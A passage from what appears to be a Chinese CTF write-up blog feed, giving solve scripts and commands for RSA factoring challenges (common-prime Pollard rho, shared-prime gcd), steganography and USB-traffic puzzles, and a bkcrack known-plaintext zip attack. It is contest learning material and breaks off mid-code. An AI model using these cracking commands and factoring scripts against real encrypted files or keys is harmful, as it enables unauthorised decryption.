<span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    p, q = gen_prime(nbits, gamma)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = getPrime(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">while</span> gmpy2.gcd(e, gmpy2.lcm(p-<span class="number">1</span>,q-<span class="number">1</span>)) != <span class="number">1</span>:</span><br><span class="line">        e = getPrime(<span class="number">16</span>)</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="keyword">return</span> n, e, c</span><br><span class="line"></span><br><span class="line">n, e, c = encrypt(<span class="number">1024</span>, <span class="number">0.48</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;n =&#x27;</span>, n</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;e =&#x27;</span>, e</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c =&#x27;</span>, c</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line"><span class="comment"># e = 58337</span></span><br><span class="line"><span class="comment"># c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br></pre></td></tr></table></figure></blockquote><p>共素数攻击（common prime RSA）。</p><p>给出 $N=pq,p-1=2ga,q-1=2gb,h=2gab+a+b$，有 $N-1=2gh$，</p><p>所以 $x^{N-1} \pmod p$ 至多有 $a$ 个值，用 $x \rightarrow x^{N-1}+3$ 代替 Pollard’s rho算法中迭代函数，能在 $\text{O}(\sqrt{a})=\text{O}(N^{\frac{1}{4}-\frac{\gamma}{2}})$ 下分解 $N$。</p><p>common prime RSA在 $g$ 过小时， $g$ 也能轻易通过分解 $N-1$ 来解出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rho</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(<span class="built_in">abs</span>(a - b), n)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; in &#123;&#125; circle&#x27;</span>.<span class="built_in">format</span>(j, i))</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line">e = <span class="number">58337</span></span><br><span class="line">c = <span class="number">13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br><span class="line"></span><br><span class="line">p, q = rho(n)</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;SangFor&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Bigrsa"><a href="#Bigrsa" class="headerlink" title="Bigrsa"></a>Bigrsa</h3><blockquote><p>BigRSA！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c = <span class="built_in">pow</span>(c, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> % c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>尝试发现 $\gcd(n_1,n_2)=p$，分别求出 $q_1=n_1/p,q_2=n_2/p$，再用常规解密方法两步求出 $m$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line">q1 = n1 // p</span><br><span class="line">q2 = n2 // p</span><br><span class="line">d1 = gmpy2.invert(e, (p-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p-<span class="number">1</span>)*(q2-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(c, d2, n2)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d1, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><blockquote><p>简简单单猜数字01-30 SangFor{md5(<strong>-</strong>-<strong>-</strong>…..)}（32位md5）</p></blockquote><p>12张图分别得到关键数字：28-08-30-07-04-20-02-17-23-01-12-19，md5得flag：SangFor{d93b7da38d89c19f481e710ef1b3558b}</p><p>​    </p><h3 id="Misc520"><a href="#Misc520" class="headerlink" title="Misc520"></a>Misc520</h3><blockquote><p>有一天，zip爱上了pcap，zip为了能与pcap创造更多机会，不断地将自己的能力表现出来。可是，LSBSteg却突然杀了出来，将pcap吞并于png中，不放出来。zip看到了png，多喝热水少做梦。zip异常的愤怒，不断地用自己的能力去报复png，不让png逃走。至今，zip仍未释怀。。。</p></blockquote><p>拿到520.zip压缩包，循环嵌套着520层zip和story文件，脚本解压出所有文件（每次解压将story文件重命名防覆盖）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">now = <span class="string">&quot;520.zip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;~~&quot;</span>+now)</span><br><span class="line">    zfile = zipfile.ZipFile(now)</span><br><span class="line">    zfile.extractall(members=zfile.namelist())</span><br><span class="line">    zfile.close()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.remove(now)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    names = os.listdir()</span><br><span class="line">    os.rename(<span class="string">&#x27;story&#x27;</span>,<span class="string">&#x27;story&#x27;</span>+now.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(names)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        <span class="keyword">if</span> name.endswith(<span class="string">&#x27;.zip&#x27;</span>) <span class="keyword">and</span> name != now:</span><br><span class="line">            now=name</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;~~~~&#x27;</span>+now)</span><br></pre></td></tr></table></figure><p>解出最里层是一张flag.png图片，按大小排序目录下所有文件，发现story150内容与其他不同：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这都被你发现了？</span><br><span class="line">我这故事不错吧，嘻嘻嘻</span><br><span class="line">那就把flag给你吧</span><br><span class="line">oh，不，还有一半藏在了pcap的心里，快去找找吧</span><br><span class="line">左心房右心房，扑通扑通的心，咿呀咿呀的❤</span><br><span class="line">72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108,</span><br></pre></td></tr></table></figure><p>得到数字 <code>72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108,</code></p><p>根据提示，zsteg查看png图片存在lsb隐写，按bgr方式提取出一个zip加密压缩包，爆破得密码<code>12345</code>解出flag.pcap。</p><p>wireshark查看发现全为USB流量，tshark提取：</p><p><code>tshark -r flag.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><p>将鼠标数据还原鼠标移动轨迹：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">8</span>:</span><br><span class="line">out=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">fi.write(out)</span><br><span class="line">fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">fi.close()</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">x -= <span class="number">256</span></span><br><span class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">y -= <span class="number">256</span></span><br><span class="line">posx += x</span><br><span class="line">posy += y</span><br><span class="line">btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">    f.write(<span class="built_in">str</span>(posx))</span><br><span class="line">    f.write(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(posy))</span><br><span class="line">    f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>最后gnuplot做图：</p><p><code>gnuplot&gt; plot &quot;xy.txt&quot;</code></p><p>得到后半部分数字：<code>130, 63, 111, 94, 51, 134, 119, 146</code></p><p>结合flag格式，推知为变异凯撒移位解密，解出：</p><p><code>[71, 87, 72, 84, 123, 87, 51, 108, 67, 111, 109, 51, 95, 116, 48, 95, 77, 33, 115, 99, 125]</code></p><p>即<code>GWHT&#123;W3lCom3_t0_M!sc&#125;</code>，按群提示换为<code>Sangfor&#123;W3lCom3_t0_M!sc&#125;</code>。</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、深信服科技股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。&lt;/p&gt;
&lt;p&gt;大赛以“网络安全为人民、网络安全靠人民”为主题，旨在</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow 吃瓜杯</title>
    <link href="https://lazzzaro.github.io/2021/08/16/match-CTFshow-%E5%90%83%E7%93%9C%E6%9D%AF/"/>
    <id>https://lazzzaro.github.io/2021/08/16/match-CTFshow-%E5%90%83%E7%93%9C%E6%9D%AF/</id>
    <published>2021-08-16T11:22:00.000Z</published>
    <updated>2021-08-16T12:32:10.014Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>比赛名称：ctfshow 吃瓜杯<br>题目范围：web pwn re misc crypto<br>题目难度：怎么简单怎么来<br>比赛奖励：ctfshow定制鼠标垫或萌妹手办<br>比赛时间：2021年8月14日(周六) 晚 7点7分<br>比赛时长：48小时<br>比赛地址：<a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Misc游戏签到"><a href="#Misc游戏签到" class="headerlink" title="Misc游戏签到"></a>Misc游戏签到</h3><blockquote><p>运气与<del>策略</del>运气的游戏。值得注意的是，第一局出现必输的情况是正常的，并且概率较低，这能表明您在七夕这个节日真的非常欧，这边建议去抽卡。<del>所以说本题没有策略，只有运气。</del></p><p>地址： 移步去备用题,flag就在这交</p></blockquote><p>运气游戏，写个循环脚本跑出分段flag。</p><p>​    </p><h3 id="Dinner-of-Cyanogen"><a href="#Dinner-of-Cyanogen" class="headerlink" title="Dinner of Cyanogen"></a>Dinner of Cyanogen</h3><p>给了两个docx，一个未加密，另一个加密。</p><p>在未加密docx得到flag第一段；</p><p>发现其中的 <code>[Content_Types].xml</code> 大小相同，上明文攻击：</p><p><code>rbkcrack.exe -C AnotherLetter.zip -c &quot;[Content_Types].xml&quot; -p &quot;[Content_Types].xml&quot;</code></p><p>得到3-key，再用7z工具解压：</p><p><code>7za x AnotherLetter.zip &#39;-p[3b982977_2706fd64_6d6a5135]&#39; -oout</code></p><p>在 <code>flag.xml</code> 得到flag第二段；</p><p>在 <code>word.xml</code> 分别用0/1代替Wingdings两种字体，转字符串得到flag第三段。</p><p>​    </p><h3 id="xl的本质"><a href="#xl的本质" class="headerlink" title="xl的本质"></a>xl的本质</h3><p>Excel 2007（.xlsx）文件本质是压缩包。</p><p>新建一个excel，插入绘图，保存退出。</p><p>替换其中 xl/drawing 目录下的 drawing.xml 为题目给的xml文件，再打开xlsx文件看到flag图片。</p><p>​    </p><h3 id="吃瓜"><a href="#吃瓜" class="headerlink" title="吃瓜"></a>吃瓜</h3><p>jpg改为zip解压，文件为base64图片，浏览器打开得到二维码，扫码得栅栏密码，枚举栏数（栏数=2）解密得flag。</p><p>​    </p><h3 id="魔王"><a href="#魔王" class="headerlink" title="魔王"></a>魔王</h3><blockquote><p><strong>需要自己包上ctfshow{}</strong></p><p>题目有很多误导，小心点哦</p></blockquote><p>w3x为魔兽争霸地图文件，直接找到地图查看工具 War3 Model Editor，找到flag字符串。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="闪电五连鞭·一鞭"><a href="#闪电五连鞭·一鞭" class="headerlink" title="闪电五连鞭·一鞭"></a>闪电五连鞭·一鞭</h3><blockquote><p>朋友们好。</p><p>今天，和大家，探讨一下，怎样打RSA置换闪电鞭。</p><p>要做到三点。</p><p>一：要做到问题真正的放松。但是线性代数基本知识要用好。这里面，该松的松，该紧的紧。松中有紧，紧中有松。这个问题非常复杂，在这里不多说。在问题的描述中有详细的解释；</p><p>二：要练好内功，你才能代码中发力，打出RSA置换劲儿。慢练，这是签到的……快练！下合上开，上合下开！所以，这个RSA置换劲儿啊……这个RSA和置换都在动啊……</p><p>三：要用高维的RSA置换劲儿，才能打出RSA置换闪电鞭。因为这个鞭的劲儿，你看……是不是，你看……都是高维的啊……</p><p>下面我打一个连五鞭啊……打了五鞭：<strong>一鞭</strong>，两鞭，三鞭，四鞭，五鞭。这五鞭要连次打，你看：实战时间，一定要动武，全身松好，用高维的劲，RSA置换劲儿！才能打出flag，打出RSA置换闪电鞭！</p><p>谢谢朋友们。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">8870619487339789349033932217513908953609539651949986489986889710933094577873155191810742828503059670650154455297603719</span></span><br><span class="line">c = <span class="number">6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="闪电五连鞭·二鞭"><a href="#闪电五连鞭·二鞭" class="headerlink" title="闪电五连鞭·二鞭"></a>闪电五连鞭·二鞭</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">random.seed(<span class="number">0x36D</span>)</span><br><span class="line">n = <span class="number">3950848271664122675439855009329233027357977239695163232943132810210035583520735079984423511153607529820284200137188647</span></span><br><span class="line"></span><br><span class="line">Zn = Zmod(n)</span><br><span class="line">P = PermutationGroupElement(<span class="string">&#x27;(1,14,25,8,23,15)(2,22,17)(3,18,13,33,11,30,26,27,10,6,16,31,28,21,29,36,7,9)(4,35,12,32,20,5,24)(19,34)&#x27;</span>)</span><br><span class="line">P = Matrix(Zn, P.matrix())</span><br><span class="line">A = Matrix(Zn, <span class="number">36</span>, <span class="number">36</span>, <span class="keyword">lambda</span> x, y: random.randint(<span class="number">0</span>, <span class="number">0x36D</span>))</span><br><span class="line">B = A * P * A^-<span class="number">1</span></span><br><span class="line">c = [...]</span><br><span class="line">C = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    C.append(c[i*<span class="number">36</span>:(i+<span class="number">1</span>)*<span class="number">36</span>])</span><br><span class="line">C = Matrix(Zn, C)</span><br><span class="line">B_inv = B^<span class="number">3</span></span><br><span class="line">C_new = C / B_inv</span><br><span class="line">cc = C_new[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="闪电五连鞭·三鞭"><a href="#闪电五连鞭·三鞭" class="headerlink" title="闪电五连鞭·三鞭"></a>闪电五连鞭·三鞭</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BB = B^3</span></span><br><span class="line"><span class="comment"># BB_inv = BB^(-1)</span></span><br><span class="line"><span class="comment"># CC = C * BB_inv</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">25126409997644048715497037905442671105116158875704245711785280791201683049008805107543997350200944348915833337286069203</span></span><br><span class="line">cc = <span class="number">2440870830361488333405717893137622686904829095539256446436231771058787790530861000815874544642875904753470292396055730</span></span><br><span class="line">cc = (cc * gmpy2.invert(<span class="number">36</span>, n)) % n</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="闪电五连鞭·四鞭"><a href="#闪电五连鞭·四鞭" class="headerlink" title="闪电五连鞭·四鞭"></a>闪电五连鞭·四鞭</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BB = B^17</span></span><br><span class="line"><span class="comment"># BB_inv = BB^(-1)</span></span><br><span class="line"><span class="comment"># CC = C * BB_inv</span></span><br><span class="line"><span class="comment"># I.trace() = 88</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">8832564044541326030658929702316436880591014904231676570839678873603730471484972295046612326549001678639811100026511993</span></span><br><span class="line">cc = <span class="number">5298954238197992022282643920507107154250709069597164746868432885002292554976622438394424965260846005857405245601483810</span></span><br><span class="line">cc = (cc * gmpy2.invert(<span class="number">88</span>, n)) % n</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">17</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="大鸟转转转"><a href="#大鸟转转转" class="headerlink" title="大鸟转转转"></a>大鸟转转转</h3><blockquote><p>为响应群主“怎么简单怎么来”的号召，特补上一道古典密码。</p><p>明文密文都是大写字母。</p><p>请解出正确的明文后，把明文转换成<strong>小写</strong>，并加上格式所包含的花括号。</p></blockquote><p>Engima密码机。</p><p>python反序列化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 